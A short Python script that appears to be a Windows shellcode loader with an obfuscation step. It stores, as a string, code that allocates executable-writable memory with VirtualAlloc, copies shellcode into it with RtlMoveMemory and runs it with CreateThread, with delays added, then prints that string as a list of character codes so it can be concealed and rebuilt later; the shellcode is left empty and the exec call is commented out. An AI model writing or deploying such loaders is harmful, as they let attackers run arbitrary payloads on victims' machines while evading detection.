import sys
import mmap
import ctypes
import time
import argparse
import urllib.request

shellcode = b''
s = f'''kernel32 = ctypes.windll.kernel32
length = len(shellcode)

time.sleep(1)

kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)

kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
kernel32.RtlMoveMemory(ptr, buf, length)

time.sleep(2)

ht = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(ptr), ctypes.c_int(0),
    ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))
)

code = ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
print('[+] Last error', ctypes.GetLastError(), ctypes.FormatError(ctypes.GetLastError()))
'''

print([ord(i) for i in s])

# exec(s)
